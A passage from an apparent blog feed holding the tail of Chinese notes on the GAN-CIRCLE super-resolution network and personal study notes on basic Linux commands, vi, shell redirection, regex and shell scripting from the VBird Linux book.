图像同理。其表达式为：$$L_{CYC}(G,F)=E_x[||F(G(x))-x||_1]+E_y[||G(F(y))-y||_1]$$ 一致性损失：相比于 $L_2$ 正则，$L_1$ 正则可以容忍估计图像和目标图像之间的小错误，并且收敛速度更快。$$L_{IDT}(G,F)=E_y[||G(y)-y||_1]+E_x[||F(x)-x||_1]$$ 联合稀疏变换损失：为了表示图像稀疏性，我们在以下联合约束条件下建立了一个基于非线性全变分的损失函数，其表达式如下：$$L_{JST}(G)=\tau||G(x)||{TV}+(1-\tau)||y-G(x)||{TV}$$其中 $\tau$ 是比例因子，设置为 0.5。 总的损失函数为：$$L_{GAN-CIRCLE}=L_{WGAN}(D_Y,G)+L_{WGAN}(D_X,F)$$ $$+\lambda_1 L_{CYC}(G,F)+\lambda_2 L_{IDT}(G,F)+\lambda_3 L_{JST}(G)$$ 当有监督信息也就是成对的图像 (x,y) 时，还可以加入监督损失，其公式如下：$$L_{SUP}(G,F)=E_{(x,y)}[||G(x)-y||1]+E{(x,y)}[||F(y)-x||_1]$$ 五、网络结构 上图是生成网络的结构示意图，如图中所示， 生成网络包括特征提取网络和重建网络两部分，特征提取网络由12个非线性特征 SR 特征块组成，每个非线性 SR 特征块 $3\times3$ 的卷积、偏置和 Leaky ReLU 组成，为了提取局部和全局的图像特征，各个隐藏层的输出通过跳跃连接结合，如图中虚线所示。 在重建网络中有两个重建分支，在图中表示为 A、B 分支，然后将两个分支合并为 C。这种网络结构通过多个分支进行运算，然后再将其输出结果合并的结构被称作网中网（network in network），而在 GoogLeNet 中被称作 Inception Module。其中的 $1\times1$ 卷积有两个优点，一方面是过滤器较小，计算快，另一方面可以提升网络的非线性性，使其可以学到更复杂的映射关系。 当是有监督的训练时，生成网络中还对原图进行了双三次插值，然后与重建网络的输出结果进行合并得到最终的结果。 上图是判别网络的结构示意图，判别网络由8个块组成，每个块由 $4\times4$ 卷积、偏置、实例正则化和 Leaky ReLU 组成，后面跟着两个全连接。图中 n64s1 中的 n64 表示通道数，s1 表示步长为1。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[《鸟哥的Linux私房菜：基础版》笔记]]></title>
    <url>%2F2020%2F04%2F02%2FVBird-Linux%2F</url>
    <content type="text"><![CDATA[本文主要是关于《鸟哥的Linux私房菜：基础篇》中第四章到第十二章的笔记，有些自己已经理解或感觉很少会使用到的东西没有再做记录，笔记的顺序做过一定的整理，不是完全按照书上的顺序，此外还加入了一些在别的地方学到的Linux的常用知识。 在命令行中[]表示可选，&lt;&gt;表示必选，{}表示任选一个。 一、基础知识 Ctrl+Alt+[F1~F6]：在桌面按下可进入编号为1~6的文本模式（又称终端接口、terminal、console），再按下相同的按键返回图形化窗口。 command [-options] 参数1 参数2 ...：一般的指令格式 command：指令名 []：表示可选 -：表示是缩写，如-h --：表示全称，如--help 参数：命令的参数 在某些特殊情况下选项和参数前面也有可能带有正号+。 在指令中无论空几格都视为一格。在Linux中大小写字母是不一样的。 Tab：具有命令补全和文件补全的功能 在一个没打完的命令名后按两次Tab就可以显示所有以该字符串为前缀的命令名 在一个没打完的文件名后按两次Tab就可以显示所有以该字符串为前缀的文件名 在-或--后面按两次Tab就可以显示改命令所有的可选项 Ctrl+其他键 Ctrl+c：终止当前进程的运行 Ctrl+z：挂起当前进程 Ctrl+d：键盘输入结束，即EOF，并且该组合键还可以当作exit命令来使用 Ctrl+a：让光标移动到整个指令串的最前面 Ctrl+e：让光标移动到整个指令串的最后面 Ctrl+?：清除本行指令 文件有好多种，在输入ls -al显示文件的属性时，第一个字符为-则是一般文件，为d则是目录文件，为l则为快捷方式（连结档） Linux 中的文件实际上没有扩展名，不过仍常根据文件的拓展名来区分文件的类型，如.sh是shell的脚本文件，.tar, .tar.gz, .zip, .tgz等为压缩文件 文件名的第一个字符为.时表示为一个隐藏文件。 根据约定好的标准，linux下不同的目录所存储的文件类型是一样的，以下目录中比较重要的有/etc, /bin, /dev, /lib, /sbin等。 /bin：存储可执行文件 /boot：存储开机会用到的文件 /dev：存储装置和接口设备 /ect：存储配置文件 /lib：存储函式库文 /media：存储可移除的装置，如软盘、光盘、DVD等 /mnt：存储暂时挂载的其他装置 /opt：存储第三方协议软件 /run：存储开机后产生的各项信息 /sbin：存储开机、修复、还原系统所需要的指令 /tmp：存储一般用户或正在执行的程序所产生的文件 /usr：存储各种软件 /var：存储变动性的数据 /home：默认的用户家目录 /root：root用户的家目录 目录符号 .：本层目录 ..：上层目录 -：前一个目录 ~：当前用户的家目录 ~用户名：该用户的家目录 /root：root 用户的家目录 /home/用户名：普通用户的家目录 /：根目录，即所有目录最顶层的目录 vim是进阶版的vi，可以用不同颜色显示文字内容，并且具有程序编写的功能，可以根据程序的类型来进行显示。vi有三种模式： 一般指令模式：用vi打开文件后默认进入一般指令模式 30↓：往下移动30行 Ctrl+f或PageDown：下一页 Ctrl+b或PageUp：上一页 n+Space：光标右移n个字符，n表示数字 0或home：移动到这一行的最前面字符 $或end：移动到这一行的最后一个字符 Shift+g：移动到文件的最后一行 gg：移动到文件的第一行 n+Enter：光标往下移动n行 /字符串：从光标处开始往下寻找字符串 ?字符串：从光标处开始往上寻找字符串 n：向下重复前一个搜寻操作 :n1,n2s/word1/word2/g：在第n1行和n2行之间搜寻word1并将其替换为word2 :1,$s/word1/word2/g：从第一行到最后一行寻找word1，并将其地换为word2 dd：删除光标所在的一整行 yy：复制游标所在的那一行 p：在光标的下一行粘贴 u：复原上一个动作 .：重做上一个动作 编辑模式：按下i,I,o,O,a,A,r,R中的任意一个字母后进入编辑模式，按下ESC键退出 指令行命令模式：输入:,?后进入指令行命令模式 :set nu：显示行号 :set nonu：取消行号 在输入命令时，如果想输入多行，可以先输入\，然后立刻输入回车键，就可以在下一行继续写了。 vi 文件名当文件名存在时直接打开，不存在时新建。一般输入i进入编辑模式，输入ESC键退出编辑模式，输入:进入指令行命令模式，:wq!中w是写入保存，q是退出，!是强制执行 如果输入alias显示 vi=’vim’，则说明在执行vi指令时，默认使用的是vim 可以用vim 后面接多个文件来同时对多个文件进行编辑，在指令行模式下，:n是编辑下一个文件，:N是编辑上一个文件，:files是列出目前这个vim所开启的所有文件。在指令行模式下输入:sq [文件名]可以同时浏览多个文件，当加文件名时则在一个新窗口打开该文件，当不加文件名时，在同一个窗口内打开。Ctrl+w+↑切换到上面的窗口，Ctrl+w+↓切换到下面的窗口，Ctrl+w+q退出当前窗口。 linux下默认的shell是bash /etc/profile：保存系统整体的设定的文件，在用户登录系统时，会自动调用/etc/profile然后该文件又会自动调用其他配置文件 ~/.bash_profile或~/.bash_login或~/.profile：当前用户的设定文件 source 配置文件名：不需注销即可把配置文件里的内容加载进来，source的作用同. 通配符 *：0到无穷多个任意字符 ?：一个任意字符 [abcd]：取[]中的任意一个字符 -：在编码顺序内的所有字符，如[0-9]表示0-9共10个数字 ^：反向选择，如[^abc]表示除了abc之外的其他一个字符 特殊字符 #：注释符号 \：转义字符 |：管线，分割两个管线命令的界定 ;：连续性命令的节点 $：取用变数的前导符 &amp;：工作控制，将指令变为背景下工作 !：逻辑非 ()：中间为子shell的起始和终止 {}：中间为命令区块的组合。 &gt;和&gt;&gt;是输出重定向，即将本来要输出到屏幕的内容输出到其他位置，如某个文件中，前者是覆盖写入，后者是追加写入，如ls -a / &gt;~/rootfile将目录/下的所有文件名以覆盖的形式写入到~/rootfile中，文件不存在时会自动建立。1&gt;和1&gt;&gt;是标准输出的重定向，即将指令正常运行时的信息重定向输出，2&gt;和2&gt;&gt;是标准错误输出的重定向，即将指令运行错误时的信息重定向输出。&amp;&gt;可以将正确和错误信息输出到同一个文件中，并且顺序不会乱 &lt;和&lt;&lt;是输入重定向，即将本来要从键盘输入的内容改为由其他方式（如文件）输入，后者由文件输入之后必须通过键盘输入EOF之后才结束 cmd;cmd：不考虑指令相关性的连续指令下达 cmd1 &amp;&amp; cmd2：若cmd1正确执行完毕，则继续执行cmd2，反之不执行cmd2 cmd1 || cmd2：若cmd1正确执行完毕，则不执行cmd2，反之执行cmd2 管线命令|和连续下达命令;是不同的，它可以让第一个命令的正确输出信息作为第二个命令的输入，有多个命令时以此类推。不是所有的指令都可以当作后面的指令，它必须要有接收标准输入的能力 在管线中当某些指令需要用到文件名来进行处理时，该标准输入和标准输出可以利用-来代替 &amp;可以让命令在后台运行，如cp -r /usr/* test &amp; 将/usr目录下的所有文件和目录复制到test目录下，该过程在后台完成 二、常用命令 exit：在命令行里输入可以实现当前用户的注销（退出当前命令行，非关机） man readline：查看bash中的默认快捷键 date：显示日期和时间 cal [month] [year]：显示日历 bc：简单好用的计算器 + - * / ^ %：支持加、减、乘、除、指数、取余等，默认输出只支持整数； 输入quit退出。 command --help：查看指令的帮助信息，即怎样使用 who：查看当前有哪些用户在线 shutdown|poweroff|halt：关机，常用第一个 shutdown [-krhc] [时间] [警告信息]：关机 -k：只发出警告信息不关机 -r：重新启动 -h：立即关机 -c：取消正在进行的shutdown指令 时间：系统关机的时间，单位是分钟，默认为1分钟 例： shutdown -h now：立即关机 shutdown -h 20:25：下一个20点25分关机 reboot：可以重启 su 用户名：切换用户 exit：在进入新用户身份后，该指令可返回原用户身份 echo $PATH：查看环境变量，echo有显示、印出的意思，$表示后面接的是变量名 alias lm=&#39;ls -al&#39;：命令别名设定功能，将ls -al这个指令设定一个别名lm 不加参数：查看所有有别名的命令 unalias lm：取消命令的别名。 history [n]：查看历史命令 n：数字，列出最近的n条命令 history [-c]：将所有历史命令全部清除 history [-raw] histfiles：查看历史命令 -a：将历史命令额外保存在histfiles文件中 -r：将histfiles文件中的内容读入到history记忆中 -w：将目前的history记忆内容写入到histfiles中。 !number执行history记忆中的第number个命令，!command向前搜索以command为开头的指令并执行，!!执行上一个命令 df [-ah] [文件或目录名]：列出文件系统的磁盘使用量 -a：列出所有的文件系统 -h：自动以KB、MB、GB等合适的格式显示 du [-ah] [文件或目录名]：评估文件系统的使用量 -ah：如上，默认以KB为单位显示 例： du -sh *：查看当前目录下每个文件、文件夹的大小 gcc 文件名：对源代码进行预处理、编译、汇编和链接，默认输出为：可执行文件”a.out”，编译后的文件”sourcename.o”，汇编文件是”sourcename.s”，预处理后的C源代码送往标准输出 gcc 文件名 -o 输出文件名 ：指定输出文件的文件名 对于多个文件联合执行的，除.h文件不需要编译外，其他文件都需要编译： gcc -c example.c gcc -c add.c gcc -c modify.c gcc -c delete.c 编译后生成目标文件example.o, add.o, modify.o, delete.o gcc example.o add.o modify.o delete.o -o example 链接以上四个文件，生成可执行文件example gcc 文件名 -l 路径名:如果头文件不在gcc的搜索路径中，可以用该选项指定额外搜索路径，如gcc helloworld.c -l /usr/include -o helloworld 将该目录加入到头文件的搜索路径中 wget [-bc] url：从指定URL下载 -b：在后台下载 -c：断点续传 进入后台下载的任务，可以先找到其下载日志文件，然后用tail -f wget-log或cat wget-log查看下载情况 ##########目录操作命令：cd, pwd, mkdir, rmdir, ls########## cd：变换目录（change directory），cd后不加任何目录表示回到家目录 pwd [-P]：显示当前目录（print working directory） -p：显示确实的路径，而不是用链接路径 mkdir [-mp] 目录名：创建一个新的目录 -m：配置文件的权限，例：mkdir -m 777 -p：直接将所需的目录（包括上层目录）递归的建立起来 rmdir [-p] 目录名：删除空目录 -p：连同上层的空目录一起删除，若目录中有内容则无法删除，例：rmdir -p a/b/c。 ls [-ahl] 文件名或目录名：显示文件或目录信息 -a：显示所有文件（包括以.开头的隐藏文件） -h：将文件的容量以人类易读的方式显示 -l：长数据串行出，包含文件的属性与权限等数据 ##########文件操作命令：cp, rm, mv, sort, uniq, wc########## cp [-adfirsu] 源文件名 目标文件名：复制文件或目录 -a：相当于-dr --preserve=all -d：若源文件为链接文件的属性，则复制链接文件属性而非文件本身 -f：强制的意思 -i：若目标文件已经存在，则在覆盖时会先进行询问 -r：递归持续复制，用于目录的复制行为 -s：复制为符号链接文件，即快捷方式文件 -u：当源文件比目标文件新或目标文件不存在时才进行更新或复制 --preserve=all：连同文件的各种属性也复制过去 rm [-fir] 文件名或目录名：移除文件或目录 -f：强制执行，可以忽略不存在的文件，不出现警告信息 -i：互动模式，删除前会先询问 -r：递归删除 例： rm -i bashrc*：删除以bashrc开头的文件或目录，其中*表示0到无穷任意多个字符 rm ./-aaa：删除名为-aaa的文件，不能直接运行rm -aaa，因为-会被当作选项。 mv [-fiu] 源文件名或目录名 目标文件名或目录名：移动文件或目录，或更名 -f：强制覆盖目标文件 -i：覆盖前先询问 -u：若源文件比目标文件新时才更新 例： mv 旧文件名 新文件名：实际是更名的效果 mv 文件名1 文件名2 目录名：当有多个文件或目录名是，最后一个一定是目录，其作用是将所有文件都移动到目录中 rm *：删除当前目录下的所有文件 rm *.txt：删除当前目录下的所有文本文档 sort [-fbnru] 文件名：排序 -f：忽略大小写 -b：忽略最前面的空格 -n：以纯数字（而不是字符）的方式排序 -r：反向排序 -u：对于相同的数据只显示一行 uniq [-ic] 文件名：对文本文件中的行去重，通常与sort命令配合 -i：忽略大小写 -c：在第一列显示重复次数 wc [-lwm] 文件名：统计文件信息 -l：仅列出行数 -w：仅列出多少字 -m：多少字符 ##########读写文件命令：echo, vi, cat, tac, nl, head, tail, od, more, less########## echo 内容 &gt; 文件名：创建文件并写入文本内容 例： echo &quot;love you&quot; &gt; zza.txt：将文本写入到zza.txt中 echo 内容 &gt;&gt; 文件名：向文件里追加内容，若文件不存在则新建 vi 文件名：打开或创建一个文本文件，并可以在vi界面输入内容 cat &gt; 文件名：创建文件并在下一行写入文本内容，输入Ctrl+C表示输入结束 cat &gt;&gt; 文件名：在文件中追加内容 cat [-nv] 文件名：由第一行开始显示文件内容，cat是concatenate（连续）的缩写 -n：打印出行号，空白行也有行号 -v：列出一些看不出来的特殊字符 tac 文件名：从最后一行开始显示（是cat倒着写） nl [-bnw] 文件名：显示的时候输出行号，cat和nl都不可以用PageDown或PageUp进行翻页 -b a：无论是否为空行，都显示行号 -n ln：在屏幕的最左方显示行号 head [-n number] 文件名：从头开始显示指定行数的文件内容 tail [-f] [-n number] 文件名：从末尾开始显示指定行数的文件内容 -f：持续侦测文件内容，当文件正在写入时使用 例： tail -n +100 /etc/man_db.conf：显示第100行往后的内容 od 文件名：以二进制的方式读取文件内容 more 文件名：显示文件内容 Space：往下翻页 b：往上翻页 Enter：往下翻一行 /字符串：在当前显示内容中往下搜索字符串 :f：显示文件名和当前显示的行数 q：退出 less 文件名：除了more有的操作，还有 PageDown：往下翻页 PageUp]：往上翻页 ?字符串：向上搜索字符串 n：重复前一个搜索 g：跑到文件的第一行 Shift+g：跑到文件的最后一行 od [-t TYPE] 文件名：显示文件内容 -t a：用默认字符来输出 -t c：用ASCII字符来输出、 -t d：用十进制来输出 -t f：用浮点数来输出 -t o：用八进制来输出 -t x：用十六进制来输出 ##########修改文件属性命令：touch, umask, chattr, lsattr########## touch [-am] 文件名：修改文件或目录的时间属性 -a：仅修改access time -m：仅修改modification time umask [-S]：查看或指定当前用户在建立文件或目录时的权限默认值。 不加参数：显示四个数字，分别表示root用户、当前用户、用户组和其他用户的权限，其中读权限r为4分，写权限w为2分，执行权限x为1分 -S：以人能读懂的方式显示当前用户、用户组和其他用户的权限，如drwxr-xr-x中的第一个d表示为目录，若为-表示为普通文件，当没有相应的权限时用-占位 例： umask 022：指定当前用户、用户组和其他用户的权限 chattr [+-=][ai] 文件名或目录名：配置文件隐藏属性 +：增加一个特殊参数 -：删除一个特殊参数 =：设定一定，且仅有后面的参数 -a：设定文件只能增加数据，不能删除和修改 -i：设定文件不能删除、改名或增加数据等。-ai只有root用户才能设定。 lsattr [-adR] 文件名或目录名：显示文件隐藏属性 -a：将隐藏文件的属性也显示出来 -d：如果是目录则只列出目录本身的属性而非目录内文件的属性 -R：连同子目录的数据也一并列出来 ##########寻找文件命令：which, whereis, locate, find, grep########## which [-a] command：寻找可执行文件/命令的路径 -a：将所有PATH目录中可以找到的指令均列出，默认是只列出第一个 whereis 文件或目录名：在一些特定的目录中寻找文件 locate [-i] 关键词：利用数据库来寻找文件，数据库一般是一天更新一次，可以用updatedb来更新数据库 -i忽略大小写 find [PATH] [option] [action]：在硬盘上寻找文件 option： -name filename：指定文件名 -size [+-]SIZE：搜索比SIZE大还是小的文件，c表示byte，k表示KB，m表示MB -type TYPE：指定文件类型，f是一般文件，d是目录，l是连接档。 path：默认是全名，也可以带有*等 action：有执行和打印等，如find / -size +1M -exec ls -l {} \;，从-exec到;为find命令额外执行的动作，{}表示由find找到的内容，;是结束的标志。即先找到size小于1M的文件，然后用ls命令列出来 grep [-acinv] [--color=auto] &#39;搜索字符串&#39; 文件名：分析一行讯息，若有所需信息则取出来 -a：将二进制文件以文本文件的方式搜索 -c：计算找到‘搜索字符串’的次数 -i：忽略大小写 -n：顺便输出行号 -v：反向选择，即显示没有出现’搜索字符串’的那一行 ##########压缩命令：gzip, bzip2, xz, tar########## 压缩文件的拓展名大多是*.tar, *.tar.gz, *.tgz, *.gz, *.Z, *.bz2, *.xz，其中.tar的文件只是打包过，没有经过压缩 gzip [-dtv#] 文件名：压缩/解压缩命令 不加参数：压缩成扩展名为.gz的文件 -d：解压，解压后会删除源文件，可对扩展名为.Z, .zip, .gz 的文件进行解压 -t：检验压缩文件的一致性，检验文件是否出错 -v：显示压缩比等信息（压缩时用） #：为数字的意思，代表压缩等级，-1最快但压缩比大，-9最慢但压缩比小 bzip2 [-dkv#] 文件名：压缩时生成的文件后缀名为.bz2，该命令的压缩率比gzip高，但速度慢些 -k：保留源文件而不删除 -dv#：和gzip相同 xz [-dlk#] 文件名：压缩时生成的文件后缀名为.xz，压缩率更高 -l：列出压缩文件的相关信息，如压缩前后的大小和压缩率等 -dk#和bzip2相同 以上三个指令只能对单一的文件进行压缩，如果是多个文件则需要先进行打包，再进行压缩 zcat/zmore/zless：用来读取纯文本文档被压缩后的压缩文件 tar [-z|-j|-J] [-cv] [-f 待建立的新文件名] 要打包或压缩的文件名列表：打包或压缩 tar [-z|-j|-J] [-tv] [-f 已有的文件名]：查看打包文件包括哪些文件 tar [-z|-j|-J] [-xv] [-f 已有的文件名] [-C 目录名]：解打包或解压缩，C为大写 -c, -t, -x不可同时出现在同一指令中 -z：用gzip进行压缩/解压缩 -j：用bzip2进行压缩/解压缩 -J：用xz进行压缩/解压缩 -z, -j, -J不可同时出现在同一指令中 -v：在压缩/解压缩过程中将正在处理的文件名显示出来 -f 文件名：指定要处理的文件 -C 目录：指定要解压到的目录 例： tar -jxv -f filename.tar.bz2 -C 目录名：用bzip2将该压缩文件解压到指定目录中 tar -jcv -f /root/system.tar.bz2 --exclude=file1 --exclude=file2：不打包目录中的某几个文件 如果不加[-z|-j|-J]则是进行打包，此时文件名要指定为*.tar，若添加[-z|-j|-J]进行压缩时文件名要指定为\*.tar.gz|\*.tar.bz2|\*.tar.xz，通过tar命令打包的文件被称为tarfile，通过tar命令压缩的文件被称为tarball ##########进程相关命令：ps, top, kill, jobs, fg, bg########## ps [-alru]：（process state）查看进程状态，结果并不动态连续 -l：以表格形式输出 -u：按用户名启动时间的顺序来显示进程 -a：显示所有用户的所有进程 -r：显示运行中的进程 top [-bcdinpqsS]：动态件事系统任务，输出结果是连续的 -b：以批量模式运行，但不能接受命令行输入 -c：显示命令行，而不仅仅是命令名 -d 秒数：设置两次刷新时间的间隔 -i：禁止显示空闲进程或僵尸进程 -n 次数：设置更新次数，显示完后退出。 -p PID：仅件事指定进程的ID,PID是个数值 -q：不经任何延时就刷新 -s：安全模式运行，禁用一些效互指令 -S：累计模式，输出每个进程的总CPU时间 kill 进程号：删除进程 fg 任务号：恢复到前台运行 bg 任务号：恢复到后台运行 jobs：查看被挂起的进程 ##########用户管理命令：useradd, usermod, userdel, passwd, su, id, whoami, w########## useradd [-degsu] 用户名：新建用户帐号（超级用户可用） -d 目录名 用户名：指定用户登入时的主目录 -e 日期 用户名：帐号终止日期 -g 群组 用户名：指定账户所属的用户组 -s shell 用户名：指定账户登录后所使用的shell -u uid 用户名：指定用户ID usermod [-degsul] 用户名：修改用户属性（超级用户可用） `-d 目录名 用户名指定用户登入时的主目录 -e 日期 用户名：帐号终止日期 -g 群组 用户名：指定账户所属的用户组 -s shell 用户名：指定账户登录后所使用的shell -u uid 用户名：指定用户ID -l 新用户名 旧用户名：修改用户名 userdel [-rf] 用户名：删除指定的用户帐号（超级用户可用） -r 用户名：不仅删除帐号，还删除所属文件 -f 用户名：删除用户登入目录及目录中的所有文件 passwd [-dlus]：设置或修改用户口令及其属性 -d 用户名：删除用户的口令 l用户名：暂时锁定指定的用户帐号 -u 用户名：结束指定用户帐号的锁定 -s 用户名：显示指定用户帐号的状态 su 用户名：切换用户身份，超级用户可切换为普通用户，而不输入口令，普通用户则需要输入口令。使用exit可以返回原来的用户 sudo passwd root：然后输入两遍密码，即可更新root用户的密码 id 用户名：查看用户的UID、GID和用户所属组的信息，默认为当前用户 whoami：查看当前用户名 w：查看当前登录系统用户和详细信息 ##########用户组管理类命令：groupadd, groupmod, groupdel########## groupadd [-go] 用户组名：新建组群（超级用户可用） -g：指定用户组ID -o：允许组ID不唯一 groupmod [-gno] 用户组名：修改指定用户组的属性（超级用户可用） -g：指定新的用户组ID -n：指定新的用户组名字 -o：允许组ID不唯一 groupdel 用户组名：删除指定的用户组（超级用户可用） ##########文件权限管理命令：chmod, chown, chgrp########## chmod 对象 操作符 权限：修改文件的访问权限 对象 u：文件所有者 g：同组用户 o：其他用户 操作符 +：增加 -：删除 =：赋予 权限 r：读 w：写 x：执行 s：设置用户ID 例： chmod g-w file：取消同组用户对file文件的写入权限 chmod 755 pict：将pict目录的访问权限设置为775 chown [-cR] 所有者/组 文件名：将指定文件的拥有者改为指定的用户或用户组 -c：显示更改的部分的信息 -R：处理指定目录以及其子目录下的所有文件 chgrp [-cR] 组名 文件名：改变文件的所属用户组 -c：显示更改的部分的信息 -R：处理指定目录以及其子目录下的所有文件 三、不常用命令 man command：查看指令如何使用，进入man指令的功能后 Space：往下翻页 q：退出 /：后加字符串，可以向下搜索该字符串 ?：向上搜索字符串 n：搜索下一个 info：和man指令的作用差不多，它把文件数据拆成一个个独立页面（节点），并用超链接来跳转到不同的页面，每个节点前有*符号 U：跳到上一个节点处 N：跳到下一个节点处 ↑|↓：移动到某个节点 Enter：进入节点 Tab：在节点之间快速移动 q：退出info page sync：让内存中尚未更新保存的数据写入到磁盘中 basename /etc/sysconfig/network：取最后的文件名，即network dirname /etc/sysconfig/network：取目录名，即/etc/sysconfig ln [-sf] 源文件 目标文件：制作连接档 -s：软连接，即快捷方式，默认是硬连接 -f：强制执行，若目标文件存在则将其删除后再建立 linux中的变量的设定name=&quot;my name is $NAME&quot;，如果变量内容有空格符，需要用单引号或双引号将其括起来，在双引号中$符后面的被当做是变量名，单引号中的特殊字符被当作纯文本。 若为变量扩增内容时，可使用：PATH=&quot;$PATH&quot;:/home/bin或PATH=${PATH}:/home/bin或PATH=$PATH:/home/bin unset 变量名：取消变量的设定 env：查看所有的环境变量 export [变量名]：将自定义变量转成环境变量，若不加变量名则默认全部环境变量 read [-pt] 变量名：从键盘输入变量 -p：后面接提示字符 -t：后面接等待的秒数 declare [-aixr] 变量名：宣告变量的类型 -a：将后面的变量定义为数组类型 -i：将后面的变量定义为整数类型 -x：将后面的变量变成环境变量 -r：将后面的变量设定为只读类型 一个变量有多个不同的内容时，内容之间由:隔开。 ${variable#/*local/bin:}：可以删除结尾是local/bin的变量内容，并且从左往右开始删除第一个 #：从最前面开始删除且只删除第一个 ##：把匹配到的全删除 %和%%：与#和##类似，只不过是从后面开始删除 ${variable/old/new}：用新的值取代旧的值，若为//old/new则所有符合的内容都要取代 new_var=${old_var-content}：如果旧变量存在则将其值赋给新变量，否则新变量的值为为content new_var=${old_var:content}：和前者类似，只是当旧变量为空时，新变量的值也取content stty [-a]：设定终端机的输入按键代表的含义，stty 是 setting tty 的缩写 -a：将目前所有的syyt参数列出来。列出的内容中intr=^C中intr表示终止当前运行的程序，^表示Ctrl键，类似的kill表示删除当前指令行的所有内容，?表示退格键。 stty erase ^h设置向后删除字符的快捷键为Ctrl+h cut -d &#39;分隔字符&#39; -f fields：从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出 -d：后面跟分隔字符，与-f一同使用 -f：依据-d后面的分隔字符将一段讯息分为数段，用-f取出第几段 -c：以字符为单位取出固定字符区间，后面跟数字范围，如12-或12-20。如echo ${PATH} | cut -d &#39;:&#39; -f 3,5将PATH信息以字符:分隔后，取出第3，5段 tee [-a] 文件名：读取标准输入的数据，并将其内容输出到文件和屏幕 -a以追加的方式写入到文件中 col [-x]：过滤控制字符 -x：将Tab键转换为对等的空格键 join [-ti12] 文件名1 文件名2：对比两个文件，将具有相同数据的行合并 -t：分隔符，默认是空格 -i：忽略大小写 -12：分别表示第1、2个文件要用哪个字段来分析，即用第1个文件的第几列和第2个文件的第几列相匹配 如第一个文件中有”name:root”，第二文件中有”name:zuzhiang”，则以“:”为分隔符，合并后的结果是”name:root:zuzhiang” paste [-d] 文件名1 文件名2：将两个文件对应的两行放到同一行，中间以Tab键隔开 -d：分割字符，默认是Tab键 -：如果file部分写成 -，表示来自标准输入的意思 expand [-t] 文件名：将Tab键转成空格键 -t：后面接数字，表示一个Tab键由几个空格代替 split [-bl] 文件名 前缀：将大文件分区成为小文件 -b：后面接想要分区后的文件大小，可加单位b,k,m等 -l：以行数来进行分区 前缀：前导符的意思，可作为分区文件的前导文字 xargs [-0epn] 命令：读入标准输入的数据，并以分隔符为界，将其分隔成为不同的参数，xargs后面没有接任何指令时，默认以echo来进行输出 -0：可将,，\，Space等字符还原成一般字符 -n：接参数的个数 例： xargs ls -al：然后输入两个文件夹的名称，则会用ls -al命令列出两个文件夹包含的文件信息 四、未整理第十一章 正则表达式正则表达式和通配符是完全不一样的东西 [:alnum:]表示英文大小写字符和数字，[:alpha:]表示任何英文大小写字符，[:blank:]表示空格键和Tab键，[:cntrl:]表示控制键，包括CR/LF/Tab/Del等，[:digit:]表示数字，[:graph:]除了空格键和Tab键之外的所有按键，[:lower:]表示小写字符，[:print:]表示任意可以被打印出来的字符，[:punct:]表示标点符号#$也是，[:upper:]表示大写字符，[:space:]表示任何会产生空白的字符，如空格键、Tab键、CR键等，[:xdigit:]表示十六进制的数字，包括0-9,a-f,A-F。 grep [-A] [-B] [--color=auto] &#39;搜索字符串&#39; filename，-A后面可加数组，为after的意思，除了列出该行外，后续的n行也列出来，-B后面可加数字，为befor的意思，除了列出该行外，前面的n行也列出来。 []表示搜索字符的集合，只表示一个字符，[^]表示反向选择，^表示定位在行首，$表示定位在行尾，.任意一个字符，*任意0到无穷多个字符，{number[,number]}表示重复字符数，如o\{2\}表示两个o，o\{2,5\}表示2到5个o，o\{2,\}表示2到 无穷个o。 ^word待搜索字符串在行首，word$待搜索字符串在行尾，.任意一个字符，*任意0到无穷多个字符，[list]字符集合，从中任取一个，[n1-n2]字符范围，[^list]不是该字符结合的任意一个字符，\{n,m\}。 sed [-nefr] [动作]分析标准输入，-n使用安静模式，标准输入只有在经过sed处理的那一行才会被显示在屏幕上，-e直接在指令行模式上进行sed的动作编辑，-f直接将sed的动作卸载一个文件内，-f filename可以执行filename中的sed动作，-rsed的动作支持的是延伸型正则表达式语法，-i直接修改读取的文件内容，而不是由屏幕输出。 [n1[,n2]]functionn1,n2表示进行动作的行数，function可以是a新增，c取代，d删除，i插入，p打印，s取代，通常搭配正则表达式。如sed &#39;s/old_str/new_str/g&#39;取代 +一个或多个字符，?0个或1个字符，|用or的方式找出数个字符串，()找出群组字符串，其中的字符串是有顺序的一个整体，()+多个重复的群组。 diff [-bBi] from-file to-file对比两个文件的差异，-b忽略一行当中仅有多个空白的差异，-B忽略空白行的差异，-i忽略大小写的不同。 cmp [-l] file1 file2以字节为单位对比两个文件，-l将所有的不同点的字节都列出来，预设是只会输出第一个不同的点。 patch -pN &lt; path_file更新文件，-p表示取消几层目录的意思，patch -R -pN &lt; patch_file还原文件，-R表示还原。 第十二章 Shell脚本如果读取到一个回车符（CR）就尝试执行该行命令；如果一行的内容太多，可以用\Enter来延伸至下一行；#可作为注释符号。 脚本文件的扩展名为.sh，可以通过bash shell.sh或sh shell.sh来执行 用exit 0表示退出脚本程序，var=$((运算内容))， 1234read -p "Please input your name:" nameecho -e "\nYour name is: $&#123;name&#125;"total=$(($&#123;a&#125;*$&#123;b&#125;)) #a*bexit 0 test -efd filename测试，-e该文件名是否存在，-f文件名是否存在并且为文件，-d文件名是否存在且为目录。 test -rwxs filename，-rwx该文件名是否存在且具有可读、可写、可执行权限，-s该文件名是否存在且为非空白文件。 test file1 -nt|ot|ef file2，-nt判断file1是否比file2新，-ot判断file1是否比file2旧，-ef判断file1和file2是否指向同一文件。 test n1 -eq n2关于两个整数之间的判定，-eq两数值相等，-ne两数值不等，-gtn1大于n2，-ltn1小于n2，-gen1大于等于n2，-len1小于等于n2 test -z string判断字符串是否为空串，若是则返回True，test -n string判断字符串是否为非空串，若是则返回True，test str1==str2判断str1是否等于str2，若相等则返回True，test str1!=str2判断str1是否不等于str2，若不相等则返回True test -r filename -a|o -x filename多重条件判定，-a表示and，-o表示or，test ! -x file中!表示取反。 [] 也可以起到判断的作用，但是其中的每个部分之间必须有空格来分割，如[ &quot;${home}&quot; == &quot;${mail}&quot; ]判断home与mail变量是否相等，变量最好用双引号括起来，不然可能会出错。 $#代表后面接的参数个数，$@代表”$1”、”$2”等，每个变量是独立的，需要用双引号括起来，$*代表”$1c$2c$3”，其中c为分割字符，一般为空格。从0开始。shift [number]可以拿掉最前面的几个参数，默认是1个。 比如在test.sh文件中写 123456echo "Total parameter number is: $#" #参数个数echo "Your whole parameter is: $@" #所有的参数echo "The 1st parameter 